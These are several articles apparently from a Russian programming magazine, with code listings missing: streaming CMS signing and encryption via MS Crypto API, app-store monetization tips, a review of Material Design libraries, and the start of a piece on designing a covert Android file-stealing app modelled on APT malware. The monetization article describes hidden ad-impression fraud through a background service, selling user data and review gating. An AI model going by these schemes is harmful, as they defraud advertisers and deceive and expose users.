   Что же делать, спросишь ты? Обращаться к основам — отвечу я! Очевидно,
раз нельзя загрузить в память 600 MiB, то необходимо файл грузить и обраба-
тывать по кусочкам. .NET-обертки над CMS так не умеют. На помощь нам при-
ходит MS Crypto API. MS Crypto API содержит два набора функций для работы
с CMS: Simplified Message Fuctions и Low Level Message Functions. Для работы
с большими файлами нам нужны Low Level. Полную реализацию на C# можно
посмотреть тут. Я же предпочитаю работать с криптографией на языке C++.
Кода в результате писать приходится меньше, а работает он быстрее. Рассмо-
трим порядок действий для реализации подписи в поточном режиме:
•  Получаем PCCERT_CONTEXT;
•  Заполняем структуры  CMSG_STREAM_INFO,  CRYPT_ALGORITHM_IDENTIFIER,
   CMSG_SIGNER_ENCODE_INFO, CMSG_SIGNED_ENCODE_INFO;
•  Получаем хендл сообщения с помощью функции CryptMsgOpenToEncode.
  Для открепленной подписи необходимо передать соответствующий флаг
   CMSG_DETACHED_FLAG;
• В цикле вызываем функцию CryptMsgUpdate и «скармливаем» ей по кусоч-
   кам файл, который необходимо подписать.

На C++ будет что-то вроде:
Вызов кода на C++ из C# будет выглядеть примерно так:





Внимательный читатель удивится — что это за IStreamReader* inputStream,
IStreamWriter* outputStream, ICertificate* signCertificate? Ответ следует
из названия переменных, но есть одна тонкость, которая для многих окажется
сюрпризом. IStreamReader, IStreamWriter, ICertificate — это интерфейсы, реа-
лизованные на C#, и это не COM-объекты. При этом мы спокойно можем вызы-
вать их методы в нативном C++. Как сделать такую красоту — тема отдельной
статьи. В результате успешного выполнения операции мы получим криптогра-
фическое сообщение. Для кодирования сертификатов X.509 и криптографиче-
ских сообщений используется Abstract Syntax Notation One, или, по-простому,
ASN 1. Для просмотра файлов, закодированных в ASN 1, можно воспользо-
ваться бесплатным ASN.1 Editor.
Подпись изнутри

ПРОВЕРКА ПОДПИСИ И ДЕКОДИРОВАНИЕ
А теперь, дорогой читатель, представь, что ты большой
начальник и должен принять важное стратегическое ре-
шение на основе отчета, который тебе прислал сотрудник       INFO
по электронной почте. Для твоего удобства отчет был под-
                                                                        Среди .NET-писан открепленной подписью. Открыв почту и скачав от-                                                                             девелоперов
чет, ты, как опытный, знающий жизнь человек, не спешишь      бытует мнение, что
принимать на веру содержимое отчета и проверяешь под-      программировать
                                                                             на C++ сложнеепись. После проверки выясняешь, что подпись неверна —
                                                                        и дольше. Уверяю
не сошлась контрольная сумма. В результате оповещаешь                                                                                        тебя, в случае
службу безопасности, которая проводит расследование       с криптографией
и выясняет, что хитрые конкуренты взломали почтовый          ситуация
                                                                             противоположна.сервер и отправили тебе фальшивый документ. Тебя на-                                                                            Гораздо быстрее
градили за бдительность, конкурентов посадили, а компа-     написать код на C++
ния наконец-то получила оригинальный отчет с проверен-    и вызвать его из .NET.
ной электронной подписью.
   Если пользователь прислал тебе отчет в виде прикрепленной подписи, тебе
для чтения придется его декодировать:





Нетрудно догадаться, что и тут разработчики .NET Framework подложили нам
свинью. Не можем мы проверить подпись большого файла! По той же самой
причине — OutOfMemoryException. Но и эту проблему несложно решить, обра-
тившись к магии MS Crypto API. Так как код поточной проверки подписи доста-
точно длинный, остановлюсь на основных моментах:
А так будет выглядеть код проверки подписи при вызове из C#:





ШИФРОВАНИЕ
Зачем нужно шифрование, все уже знают. PKI нам дает полезную плюшку: мы
можем зашифровать один документ так, что расшифровать его смогут не-
сколько получателей. Это очень удобно. Для этого нам нужно иметь сертифи-
каты получателей.
РАСШИФРОВАНИЕ
При расшифровании необходимо, чтобы сертификат, указанный при шифро-
вании в коллекции получателей, был установлен в хранилище сертификатов.
Так как сообщение может быть зашифровано и адресовано нескольким полу-
чателям, для расшифрования нам необходимо найти того получателя, серти-
фикат которого установлен в нашем хранилище сертификатов.





ЗАКЛЮЧЕНИЕ
В статье не удалось охватить все аспекты PKI, так как их очень много. Тем
не менее закодить основные операции ты теперь сможешь без проблем. Раз-
работчикам, которые умеют писать на C#, рекомендую освоить C++ хотя бы
на базовом уровне. Это очень пригодится, когда придется работать с натив-
ными функциями. А до многих возможностей ОС по-другому и не добраться,
так как .NET реализует весьма ограниченный набор возможностей. Напри-
мер, .NET не имеет полной поддержки MS Crypto API и CNG (cryptography next
geberation), поэтому тебе придется писать тонны P/invoke-кода на С# либо
значительно меньше на C++.
   Как видишь, работа с PKI достаточно сложная и требует серьезной подго-
товки, выдержки и терпения. Перед тем как бросаться реализовывать класс-
ные фичи, крайне важно понимать основные концепции PKI.
  За кадром остались поточное шифрование и расшифрование, подпись не-
сколькими сертификатами, генерация запросов на сертификат и многое другое,
но основу я тебе показал. Код примеров с тестами можно скачать на GitHub.
КОДИНГ





 Владимир Петрович
     Тимофеев
10rusdelphi.com СОВЕТОВ
НА 10 МИЛЛИОНОВ
ЗАРАБОТОК В МАГАЗИНАХ ПРИЛОЖЕНИЙ:
ОПЫТ ДЕСЯТИ МИЛЛИОНОВ УСТАНОВОК
С 1 июня 2014 года одно из моих приложений пережило
65 обновлений и в декабре 2015-го наконец получило
более десяти миллионов установок. Поэтому я почувство-
вал, что имею моральное право сделать статью с совета-
ми о том, как достичь аналогичного процветания :).

1. ИССЛЕДУЙ РЫНОК И СДЕЛАЙ ПЛАН
Пионерам разработки жить было легко — все, что они писали, было востре-
бовано. Сейчас же браться за новое приложение без долгого изучения рын-
ка практически бессмысленно. Приложение должно либо быть единственным
и неповторимым, либо решать все те же задачи, но быстрее/лучше/бесплатно
(и без рекламы). Но и этого на самом деле недостаточно. Нужно заранее про-
думать содержание приложения, его нишу в магазине и способы монетизации.
   Начинай разработку с анализа рынка, для этого ответь на вопросы:
   • Что ищут пользователи?
   • Какие потребности еще не удовлетворены приложениями?
   • Какие есть приложения, которым не хватает пары-тройки убийственных
    функций?

Зарабатывай, как хакер

Реклама, как ни крути, раздражает пользователей. А что, если убрать ее со-
всем и зарабатывать на ее просмотрах, но не показывать пользователю?
Для этого:
1. Делаешь сайт с баннерами, платящими за просмотры (читай — за посеще-
   ния).
2. Делаешь сервис в приложении, в котором будет этот сайт загружаться.

Показывать сам сайт пользователю необязательно. Все работает, у пользо-
вателя расходуется чуть трафика и немного электричества, и все довольны...
до тех пор, пока (если) тебя не настигнут репрессии со стороны Гугла.



2. СДЕЛАЙ ЛОКАЛИЗАЦИЮ
Родные средства разработки позволяют сразу выпустить приложение с ин-
терфейсами для разных языков. Для этого достаточно добавить новый файл
strings.xml в нужную папку проекта. Операционная система сама подставит
подходящие строковые ресурсы во время работы приложения. А если подхо-
дящих не найдет, то возьмет ресурсы по умолчанию.
  К примеру, если на устройстве у нас стоит финский язык, а в приложении
доступны только русские и дефолтные английские строчки, ОС выберет ан-
глийские строчки, так как финских ресурсов нет. Если на устройстве будет сто-
ять русский, то подгрузится русская локализация.
   Существует много сайтов, помогающих делать локализацию приложений.
Например, oneskyapp.com — в нем можно организовать перевод XML-файлов
с указанием на скриншотах, где строчка будет использоваться в приложении.
Это очень важно для переводчика — контекст фразы может быть непонятен.
Проект можно сделать открытым и позвать всех желающих помочь в переводе
своего приложения.

3. ПЕРЕВЕДИ ОПИСАНИЕ В GOOGLE PLAY
Консоль разработчика позволяет добавить описания на разных языках. Мы мо-
жем выставить разные иконки, баннеры, тексты, адаптировав их под особен-
ности пользователей конкретной страны. Здесь мы видим большой простор
для ASO (поисковая оптимизация приложений). В каждой стране есть свои ча-
сто употребляемые ключевые слова, нам обязательно нужно использовать их
в тексте описания.

4. ЭКСПЕРИМЕНТИРУЙ
Желтая или зеленая иконка? Синий или красный фон у баннера? Часто сра-
зу непонятно, какой лучше выбрать дизайн или описание. Поэтому были при-
думаны сервисы для тестирования вариантов пользователями. Они отвечали
на вопрос, что больше нравится. А сейчас проводить такие эксперименты мож-
но сразу в Google Play. Настроить эксперимент можно также в консоли разра-
ботчика. Маркет сам разделит пользователей пополам и скажет, где установок
было больше, а где меньше.
   Запустить несколько экспериментов одновременно не получится, так что
экспериментируй постоянно.

5. УВЕЛИЧЬ ШТАТ ПРОЕКТА
Не очень антикризисный совет, но... с ростом качества приложений и конку-
ренции между ними требуется работа не одного разработчика, а целого от-
дела. Нужен дизайнер, понимающий, как взаимодействует с приложением
пользователь, он должен знать особенности операционной системы и прин-
ципы навигации по приложениям и внутри их. Требуется продуктовый менед-
жер, отвечающий за потребительские качества приложения, знающий свою
нишу в магазине приложений и готовящий для приложения название, описа-
ние и прочую мишуру, без которой пользователь тебя не заметит. Не повредит
и специалист по продвижению приложений, поскольку каждый магазин име-
ет свои методы для этого. Ну и конечно, ты — программист, который сделает
быстрое и плавное анимированное приложение (стильно, модно, молодежно).
Оптимизация работы приложения требует достаточно высокой квалификации
и знаний. Так что подключай к проекту друзей, знакомых и всех, кого можешь.

Внимание: комментирует IT-эксперт

Все школьники мечтают об айфонах, но покупают им, по финансовым сооб-
ражениям, обычно смартфоны на Андроиде. И в этом заключается наша про-
граммистская интернациональная боль: довольные двоечники, прямо не вы-
лезая с уроков, ставят оценки нашим приложениям и пишут к ним бессвязные
отзывы, которые не имеют значения для других пользователей, но учитывают-
ся Гуглом и влияют на наш рейтинг и место в поисковой выдаче.



6. ТЕСТИРУЙ ПРИЛОЖЕНИЕ
Это может показаться банальностью, но тестов много не бывает. Тестируй сам,
подключай друзей к процессу! Можно написать автоматические тесты (это
большая тема для отдельной статьи), существуют и сервисы для тестирования
приложений на реальных устройствах. Тесты можно устроить прямо в марке-
те (альфа- и бета-тестирование). Для этих тестов можно собрать группу в G+,
все ее пользователи смогут установить еще не опубликованное приложение
или получат обновление. Также можно выслать приглашение к тестированию
на имейл.
   Когда тестирование закончилось, можно эту версию приложения сразу
опубликовать.

7. НЕ ЗАБЫВАЙ ПРО ОБРАТНУЮ СВЯЗЬ
Для сбора мнений эффективнее всего организовать сообщество пользовате-
лей в соцсетях. Необходимо читать отзывы о приложении в GP, и на них лучше
отвечать.
   Пользователи часто сами подсказывают, каких функций им не хватает, так
что это реальная возможность улучшить приложение и повысить его ценность
в глазах потребителей.
Формула расчета поисковой выдачи

Вот формула формирования выдачи приложений по поисковому запросу: рей-
тинг + установки + «магия». Думаю, с первыми двумя математическими фак-
торами все ясно и понятно. На них выросла целая индустрия покупки и про-
дажи установок и отзывов (тот же самый IT-эксперт за 50 копеек, используя
школьный Wi-Fi, напишет хвалебный отзыв и скачает приложение, ему совсем
не нужное).
   А вот в раздел «магия» регулярно пытаются заглянуть целые агентства, бла-
годаря чему мы кое-что о нем узнали:
1. Фактор «магия» меняется Гуглом для перетряски приложений в маркете.
2. На него влияет имя пакета приложения и ключевые слова из описания и на-
   звания.
3. Фактор учитывает заработки, то есть покупки самого приложения или вну-
   три него (в этом есть прямой экономический интерес, так как 30% получит
   сам Гугл).
4. Учитываются технологии, используемые в приложении, то есть использова-
   ние рекомендуемого дизайна или библиотек в поиске поднимет тебя выше
    тех, кто не использует их (этот тезис спорный).
5. Ответы на негативные отзывы — обратная связь.
6. Факторы полезности для пользователя: время работы с приложением, вре-



8. ПРОСИ ПОЛЬЗОВАТЕЛЕЙ ОБ ОТЗЫВАХ
Отзывы и оценки очень важны для продвижения, но нам-то нужны только хо-
рошие! Поэтому (и не нами с тобой) было придумано просить о рейтинге толь-
ко лояльных пользователей. Для этого нужно собирать небольшую статисти-
ку внутри приложения и по ней понимать, просить или не просить отзыв. Еще
один вариант: вывести диалоговое окно со звездочками и, если пользователь
ставит 4–5, отправлять в маркет оставлять отзыв, если меньше — катапульти-
ровать пользователя писать письмо в поддержку с претензиями или пожела-
ниями.

9. ПОЛОЖИ БОЛТ НА КОНКУРЕНЦИЮ
Совет не для инди, но я все равно расскажу не совсем честный, однако весьма
эффективный способ повысить доходность уже работающих приложений. На-
пример, одна компания имеет в App Store множество приложений, продающих
аудиокниги. У них есть несколько аккаунтов разработчиков, и конкурируют они
в основном сами с собой, продавая одно и то же содержимое, но в разных упа-
ковках. Согласись, приятно, когда в ответе на запрос «аудиокниги» пять при-
ложений и все они твои. Сделать это очень просто, имея легальный контент
на руках. Формально все выглядит честно и придраться не к чему, а по фак-
ту — грубо нарушены правила конкуренции.

10. ОСТАВЬ ИЛЛЮЗИИ
Одним предложением: на разработку тех же «Злых птичек» инвестировали
с самого начала миллион долларов, и выстрелила она только с 52-й попытки
(миллион, Карл!).

Варианты монетизации

1. Платная версия за 99,99 фантиков.
2. Реклама в приложении:
   а) маленький баннер;
  б) полноэкранный баннер;
   в) нативная реклама;
   г) видеореклама;
  д) реклама других продуктов внутри своего приложения.
3. Покупки внутри приложения.
4. Продажа личных данных пользователя.

Пройдем по всем пунктам более подробно.
   Платная версия приложения, сюда же можно отнести внутриигровые по-
купки. Если ты планируешь зарабатывать на этом, то должен тебе сказать, что
пользователи Андроида (в отличие от юзеров iOS) почти не платят за приложе-
ния (ничего подобного, я однажды, эээ, одно купил... — Прим. ред.).
  По моим грубым прикидкам, на тысячу установок приходится одна покупка.
Так что рассчитывать на большие заработки тут не стоит.
  Можно собирать и продавать личные данные пользователя. Но, во-первых,
собирать их становится все сложнее, а во-вторых — нужен покупатель. А он
охотнее пойдет к известным монополиям: в качестве и объемах их данных со-
мневаться не приходится.
   Значит, нам остается только реклама.
   Для размещения рекламы нужно выбрать сеть, например AdMob от Google
или MoPub от Twitter. Рекламных сетей сейчас очень много, они часто пере-
продают рекламу друг другу, поэтому решение вопроса с их доходностью —
это тема отдельного исследования. Все они предоставляют свои SDK для ин-
теграции в приложение. Ты сам выбираешь, где и когда показывать рекламу.
Форматы рекламы почти везде одинаковые.
Баннеры и полноэкранные объявления видели многие, они раздражают
пользователей и оплачиваются, только если по ним кликали. Нативная рекла-
ма хитрее, она встраивается в контент приложения, особо не доставая поль-
зователя и нередко при этом уродуя интерфейс не хуже баннеров.
  Еще есть видеореклама, тут платят за то, что пользователь посмотрел ре-
кламный ролик. Можно простимулировать пользователя к просмотру этого
ролика, например давать ему за это игровую валюту или открывать дополни-
тельные опции (скажем, отключения рекламы). Тут важно учитывать ограни-
чения пользователя по доступу в интернет: на мобильном интернете длин-
ное видео может влететь в копеечку, и пострадавший напишет гневный отзыв,
так как пользователи ошибок не прощают (им подавай быстрое, бесплатное
и без рекламы, а в награду тебе поставят одну и две звездочки в магазине).
   Если твой «отдел продаж» найдет подходящих партнеров, то можно прода-
вать рекламу любых сопутствующих товаров в обход рекламных сетей.
КОДИНГ





                                                                     Сергей Мельников
                                                                                            mail@s-melnikov.net,
                                                                                         www.s-melnikov.netЛУЧШИЕ
БИБЛИОТЕКИ
ДЛЯ MATERIAL
DESIGN

                САМЫЙ ПОЛНЫЙ
                 ОБЗОР ПОЛЕЗНОСТЕЙ
                 ДЛЯ ANDROID-
                  РАЗРАБОТЧИКОВ
В прошлой статье мы рассматривали компоненты и вид-
жеты библиотеки совместимости от Google, позволяю-
щие «старым» (до 5.0) версиям Android прикидываться
молодыми и стильными, примеряя меха Material Design’а.
Однако, как ты уже знаешь, «корпорация добра» не сра-
зу осчастливила программистов своими библиотеками
и долгое время эта ниша оставалась незаполненной. Раз-
умеется, нашлись добрые программисты, предложившие
свои варианты реализации Material-компонентов для всех
версий Android в соответствии с гайдлайнами Google.
Сегодня мы рассмотрим некоторые опенсорсные проек-
ты, проверенные временем, разработчиками и, конечно,
пользователями приложений.


MATERIALDRAWER
Ссылка: github.com/mikepenz/MaterialDrawer
Автор: Mike Penz
MinSdkVersion: 10

Начнем, пожалуй, с самой известной среди Android-разработчиков библио-
теки — MaterialDrawer. Как ясно из названия, она реализует виджет Navigation
Drawer, и делает это просто и элегантно (смотри рисунок 1):
Метод withIcon определяет иконку слева, withBadge — тестовую метку справа
(здесь, например, удобно отображать число новых сообщений или звонков),
а setEnabled управляет доступностью элемента.





Рис. 1. Готовый Navigation Drawer за 5 минут

Обработка нажатий на элементы меню:
Обработкой длинного клика занимается метод withOnDrawerItemLongClickList
ener с обработчиком onItemLongClick.
  В наличии поддержка разных аккаунтов с аватарками и быстрое переклю-
чение между ними. Также библиотека может похвастаться нехилым набором
иконок для пунктов меню. В репозитории доступен подробнейший пример ис-
пользования.


FLOATINGACTIONBUTTON
Пожалуй, Floating Action Button — наиболее популярный объект реализации
в сторонних библиотеках. Учитывая, что неплохая поддержка FAB появилась
и у Google, большинство из них потеряло актуальность и перестало развивать-
ся. Мы же рассмотрим библиотеку с функционалом, отсутствующим в Support
Library от Google.

Ссылка: github.com/futuresimple/android-floating-action-button
Автор: Jerzy Chalupski
MinSdkVersion: 14

В Hangouts при нажатии на кнопку с «+» на заглавном экране открываются до-
полнительные Action-элементы с подписями. Рассматриваемая библиотека
реализует подобный функционал (рисунок 2). Вся «магия» готовится в размет-
ке активности или фрагмента:
Элемент FloatingActionsMenu содержит две вложенные кнопки с подписями
слева, появляющиеся при нажатии исходной. В коде же остается написать
только обработчики нажатия:





По адресу доступен форк этой библиотеки, рассчитанный на устройства
с API 4.
   Замечу, что данный элемент (дополнительные Action’ы, выпадающие из FAB)
пока не является парадигмой Material Design’а, скорее, это эксперимент Google
исключительно для Hangouts, что, кстати, было озву-
чено на Droidcon 2015.


DISCRETESEEKBAR
Ссылка: github.com/AnderWeb/discreteSeekBar
Автор: Gustavo Claramunt
MinSdkVersion: 7

Библиотека реализует компонент Discrete Slider, ак-
тивно показывающий изменение прогресса в виде
«капли» с текстовой меткой (рисунок 3). Для версий
Android до 5.0 имитируется эффект «ряби» при нажа-   Рис. 2. Три выпадающих FAB
тии на слайдер. Добавление компонента в разметку
тривиально:





                                 Рис. 3. Слайдер
                            и его «капля»



Для написания кода доступны обработчики:
onProgressChanged — при изменении про-
гресса, onStartTrackingTouch — при первом
прикосновении,  onStopTrackingTouch —
при убирании пальца.
Кроме того, с помощью обширных свойств компонента можно менять внешний
вид и поведение. Например, чтобы задать основные цвета (окантовки, капли
и «ряби»), достаточно указать в разметке:

app:dsb_indicatorColor=”@color/accent”
app:dsb_progressColor=”@color/accent”
app:dsb_rippleColor=”@color/divider”


ANDROID-SWIPE-
TO-DISMISS-UNDO
Ссылка: github.com/hudomju/android-swipe-
to-dismiss-undo
Автор: Hugo Doménech Juárez
MinSdkVersion: 15

Данная библиотека реализует эф-
фект свайпа для элементов списков
ListView и ReсyclerView. После смахи-
вания вместо элемента появляется
один или несколько Action’ов, как пра-
вило, удаляющих элемент, но с воз-
можностью отмены (рисунок 4).
  Сокращенный  вариант  разметки
элемента списка представлен ниже:     Рис. 4. Отмена удаления элемента RecyclerView
Здесь к разметке добавляется невидимый слой LinearLayout (visibility=»gone»),
который появится после свайпа. В данном случае он содержит две тестовые
метки — «Удалено» и «Отмена».
   Очевидно, для отмены удаления элемента необходимо обработать нажа-
тие на соответствующую метку:
Метод canDismiss() определяет, может ли быть удален элемент по индексу,
а onDismiss() окончательно его удаляет. Для обработки нажатий используется
специальный обработчик SwipeableItemClickListener, в методе onItemClick ко-
торого отлавливается нажатие на метку «Отмена» с последующим вызовом
undoPendingDismiss().
   Данная библиотека в силу простоты и лаконичности хорошо подходит
для расширения функционала свайпов. Но есть небольшой подводный булыж-
ник — пример из репозитория крашится при использовании RecyclerView, так
как не находит обработчик onRequestDisallowInterceptTouchEvent. Фикс триви-
ален до неприличия:
Теперь вместо SwipeableItemClickListener используем приведенный класс:




Возможно, когда ты прочтешь эти строки, данное исправление уже будет в ре-
позитории проекта.


CUSTOM-RATING-BAR
Ссылка: github.com/kanytu/custom-rating-bar
Автор: Pedro Oliveira
MinSdkVersion: 4

RatingBar можно по праву назвать самым печальным виджетом всего Android
SDK. Казалось бы, паттерн взаимодействия с пользователем в виде выбора
звездочек рейтинга интуитивно понятен, удобен и не требует от пользователя
лишних телодвижений вроде необходимости печатать текст на экранной кла-
виатуре или выбирать из списка подходящий вариант… Но нет, стандартный
компонент — это нечто!
   Во-первых, он масштабируется чуть менее, чем
никак, то есть если, например, вставить его в диа-
логовое окно, то на смартфоне с диагональю 4.65’
в портретном режиме пять звезд уже не влезут
и число автоматически уменьшится до четырех, по-
троллив и пользователя, и разработчика. Во-вто-
рых, как подсказывает Stack Overflow, у RatingBar’а
все-таки можно установить style=»?android:attr/
ratingBarStyleSmall»,  уменьшающий  размер
звездочек до… точек  (!), что также озадачивает.
В общем, использовать этот компонент в адаптив-
ной разметке чрезвычайно неудобно, если вооб-
ще возможно.
   Однако найти сторонние реализации RatingBar’a
почему-то не так-то просто. Я остановился на го-
товом классе (именно классе, не библиотеке) —
сustom-rating-bar,  который  нужно  скопировать
в проект вручную.
   Виджет добавляется в разметку вполне стан-   Рис. 5. Material RatingBar
дартно (рисунок 5):
Размеры учитываются корректно, и указанная ширина layout_width=»match_
parent» гарантирует, что этот RatingBar впишется в отведенное для него ме-
сто. Использовать также просто:





Выбор рейтинга сопровождается анимацией, а в качестве звездочек можно
использовать любые растровые изображения.
   Кстати, в репозитории автора есть несколько других полезных классов,
не пропусти!


MATERIAL DIALOGS
Ссылка: github.com/afollestad/material-dialogs
Автор: Aidan Follestad
MinSdkVersion: 8

Данная библиотека специализируется исключительно на Material-диалогах
(рисунок 6). Взору разработчиков представлены самые разнообразные вари-
анты — простые (Basic), с кнопками (Action), со списком (List), с единственным
(Single Choice) и множественным (Multi Choise) выбором элементов, с нестан-
дартной разметкой и адаптером (Custom Adapter), с выбором цветов и темой
оформления, с круговым и линейным прогрессом (Progress Bar). К сожалению,
не хватает диалога выбора даты и времени.
  В качестве примера рассмотрим вариант диалога с произвольным (нестан-
дартным) содержимым:
С помощью метода customView указывается xml-файл с необходимой раз-
меткой (Layout), а логический параметр wrapInScrollView определяет, нужно ли
поместить содержимое внутрь ScrollView для скроллинга на маленьком экра-
не смартфона. Очевидно, что при использовании компонентов, изначально
поддерживающих скроллинг (ListView или RecyclerView), значение нужно уста-
новить в false. Метод positiveText определяет заголовок так называемого по-
ложительного действия (OK, Yes, Agree и так далее), а callback задает обра-
ботчик нажатия действия — onPositive. По аналогии используются negativeText
(onNegative) и neutralText (onNeutral).
   Библиотека постоянно обновляется, в Google Play доступен полный при-
мер.





Рис. 6. Так и хочется куда-нибудь нажать


MATERIAL
Ссылка: github.com/rey5137/material
Автор: Rey Pham
MinSdkVersion: 9

Выше мы познакомились с отдельными виджетами Material Design’а, теперь
пришло время подключить тяжелую артиллерию. Material — библиотека, как го-
ворится, на все случаи жизни. В ней есть все необходимые материальные вид-
жеты — Navigation Drawer, круговые и линейные Progress Bar, разнообразные
кнопки (FAB, с окантовкой и без), переключатели (Checkbox, Radio Button, Switch),
слайдеры (Continuous, Discrete), выпадающие списки (Spinner), поля ввода
с фильтрацией (Textfields), всплывающие информационные панели (Snackbars),
разные виды диалогов (Simple, Choice, Multi Choice), поддерживающие нестан-
дартную разметку (Custom Layout), а также компоненты выбора даты и времени.
Библиотека поддерживает кастоматизацию всех элементов — цвета, темы, эф-
фекта «ряби» при нажатии, анимации и тому подобного (рисунки 7–8).





   Кнопки                              Переключатели

Единственное, что откровенно не понравилось, — это слайдеры, которые
настолько неохотно реагируют на прикосновения, что отбивают всякое же-
лание их использовать. Но не беда — ранее мы уже упомянули Discrete
Seekbar, его и советую взять на замену. Остальные компоненты работа-
ют без нареканий. Автор библиотеки на официальном форуме всегда от-
вечает на вопросы и подсказывает пути решения тех или иных проблем.
 MATERIAL DESIGN ANDROID LIBRARY
  Ссылка: github.com/navasmdc/MaterialDesignLibrary
  Автор: Ivan Navas
  MinSdkVersion: 8

 Еще одна комплексная библиотека, но с меньшим числом виджетов. В нали-
  чии все виды кнопок (с поддержкой анимации), переключатели (Switch), слай-
 деры (Slider), индикаторы Progress Bar (круговые, линейные), панели Snackbar
 и простые диалоги (рисунки 9–10). Дополнительно реализован готовый диа-
  лог выбора цвета по значениям красного, зеленого, синего (R,G,B).





Готовый пример                           Выбираем цвет

 Если это все, что тебе нужно, — можешь смело использовать данный вариант,
 особенно для совсем уж старых устройств с Android 2.2 на борту.
ВЫВОДЫ
Сегодня мы рассмотрели ряд полезных библио-
тек, помогающих вдохнуть толику Material Design
в ранние версии Андроида. Наверняка у тебя воз-
ник вопрос: стоит ли все это использовать или
лучше остановиться на библиотеке совместимо-
                                 WWW
сти Google? Однозначного ответа, естественно,
не существует. Логика подсказывает, что как толь-       В Google Play существуют
ко тот или иной компонент появится в AppCompat         приложения-сборники,
                                                                     наглядно демонстрирующиеили Design Support Library, необходимость в сто-                                                               компоненты множества библиотек
ронней библиотеке отпадет сама собой. Впрочем,      для разработчиков. Используя
вряд ли стандартный компонент Navigation Drawer      подобные сборки, можно сразу
                                                            же оценить функциональностькогда-нибудь сравнится по удобству работы с тем                                                                    виджетов без скачивания
же MaterialDrawer Mike Penz. Лично я не вижу ни-                                                              и компиляции тестовых проектов.
чего криминального в использовании сторонних    Ищи по названиям — Libraries for
библиотек при условии, что они не противоречат     Developers, API Demos for Android,
                                                                               Android Libraries.
гайдам Google и здравому смыслу.


Шрифт Roboto

В Material Design широко используется новый шрифт Roboto. Он не входит
в библиотеку совместимости, но его можно использовать в предыдущих вер-
сиях Android с помощью библиотеки typerlib.
   Добавляем в build.gradle зависимость:





   Меняем шрифт:
  На рисунке 11 приведен пример использования нового шрифта. Нужно ска-
зать, что разница не сильно заметна. Кроме того, не у всех элементов (напри-
мер, стандартного заголовка) таким образом можно сменить шрифт.

                                                                  Рис. 11.
                                                       Найди 10 отличий
КОДИНГ





                                                                             Андрей Пахомов
                                                                                            mailforpahomov@gmail.comУЧИМСЯ
У СОЗДАТЕЛЕЙ APT





ЧЕМ TAIDOOR, IXESHE И СOZYDUKE МОГУТ
ПОМОЧЬ МИРНОМУ ПРОГРАММИСТУ?
ВВЕДЕНИЕ
Когда антивирусные компании впервые начали
публиковать обзоры Flame, с определенного угла
зрения они читались как самая настоящая реклама
этого продвинутого зловреда. Слаженный коллек-
тив, миллионы долларов «инвестиций», высокие
                                             WARNINGтехнологии, архитектура, паттерны, высочайшая
квалификация... Вкусно звучит, не правда ли? Раз-    Вся информация предоставлена
умеется, абсолютное большинство продвинутой     исключительно в ознакомитель-
                                                               ных целях. Ни редакция, ни автормалвари пишется под винду, но это не значит, что
                                                                  не несут ответственности за лю-
мы, мобильные кодеры, не можем кое-чему у них                                                               бой возможный вред, причинен-
подучиться! Может быть, и про нас когда-нибудь    ный материалами данной статьи.
напишут хвалебные обзоры? :)

Немного об Advanced Persistent Threat

C недавних пор в IT-словаре появился новый термин APT — сокращение от ан-
глийского Advanced Persistent Threat, буквально это можно перевести как «про-
двинутая постоянная угроза». Под этой аббревиатурой обычно имеют в виду
создание и внедрение вредоносных программ, нацеленных на хищение доку-
ментов и другой важной информации (невсегдаAPTподразумеваетподсо-
бойиспользованиемалвари,главноездесь—целевая,персонализированная
атака,направленнаянаконкретнуюкомпаниюирежиссированнаячеловеком
вобходсистемзащиты.—Прим.ред.). Такая малварь встает в систему и неза-
метно отсылает на сервер все интересное, что есть на компьютере, при этом
никак не нарушая привычного ритма работы пользователя. Особо удачливые
APT остаются незамеченными несколько лет.
   APT-вредоносы отличаются продуманностью и балансом, отчеты о таких
бот-сетях содержат много полезной информации: логическая схема органи-
зации сети, методы проникновения, логика работы и многое другое.
   APT-сети существуют на удивление долго. Так, согласно данным исследо-
вателей, сеть Naikon действует с 2009 года. Одна из причин — слабая антиви-
русная защита.



АРХИТЕКТУРА
Начнем с логики всего приложения. Хорошая малварь должна обладать гиб-
ким кодом — это позволит ей быть долгосрочным проектом. Будет проще об-
новлять модули, работать командой или просто рефакторить классы с целью
сокрытия от сигнатурного поиска антивирусов.
   Создавать поддерживаемый Java-код невозможно без паттернов. По сути,
паттерны — это общеизвестные шаблоны кода, позволяющие впоследствии
легко менять логику приложения. Мы уже разбирали DI-паттерн в статье
«Шесть лучших библиотек разработчика», теперь мы реализуем паттерн MVP.
  MVP расшифровывается как «Model — View — Presenter». Это три слоя, на ко-
торые будет разделено приложение. Паттерны лучше всего изучать на практи-
ке, сейчас мы начнем реализовывать интерфейсы, и ты поймешь, что к чему.
  Слой View обычно представляет собой пользовательский интерфейс — ви-
зуальные объекты приложения, с которыми может взаимодействовать пользо-
ватель. В нашем случае это будет объект, отвечающий за сбор файлов на си-
стеме:



Интерфейс слоя Model используется для обработки и предоставления данных.
В классическом сценарии на класс этого интерфейса возлагается вся работа
с данными, требуемыми для слоя View; мы будем через Model осуществлять
сетевые операции:





Слой Presenter нужен для связи между Model и View, а также для передачи ко-
манд из пользовательского интерфейса. Именно благодаря Presenter слои
Model и View возможно разрабатывать без оглядки друг на друга, а в главном
Activity приложения будет минимум кода:




БОЛЬШЕ ПАТТЕРНОВ!
Как ты уже знаешь из наших статей, в Android все сетевые запросы выполняют-
ся в отдельном потоке. Так как время таких запросов нелинейно, нужно будет
как-то оповещать Presenter о результатах отправки данных. Можно останавли-
вать работу Presenter циклом с использованием команды sleep, но это плохой
подход, и лучше так не делать.
  В Android есть готовая Java-реализация паттерна «Наблюдатель» (Observer).
Этот шаблон позволяет в приложении быстро реализовать связь «один ко мно-
гим»: при изменении состоянии одного объекта остальные будут автомати-
чески оповещены об этом. Объект, который находится под наблюдением, на-
зывается Observable и наследует одноименный класс. Объекты-наблюдатели
наследуют класс Observer.
   Как ты видишь, создание приложения, на 100% следующего одному ша-
блону, — скорее утопия. Сегодня мы используем два паттерна, причем один
из них серьезно модифицирован.

РЕАЛИЗАЦИЯ
Теперь можно создать классы, реализующие интерфейсы выбранных паттер-
нов. За поиск файлов на устройстве будет отвечать класс FileFunc. Нам сейчас
не так важно, как именно он будет найден на устройстве, главное — реализо-
вать метод, предоставляющий доступ файлу для отправки:





Вопрос поиска файлов на устройстве мы уже поднимали не раз. К примеру, ты
можешь почитать об этом в статье «Шифровальщик для Android».





За сетевую часть будет отвечать класс NetworkFunc. Он будет расширять
Observable, это позволит ему рассылать информацию о статусе отправленных
в сеть пакетов:




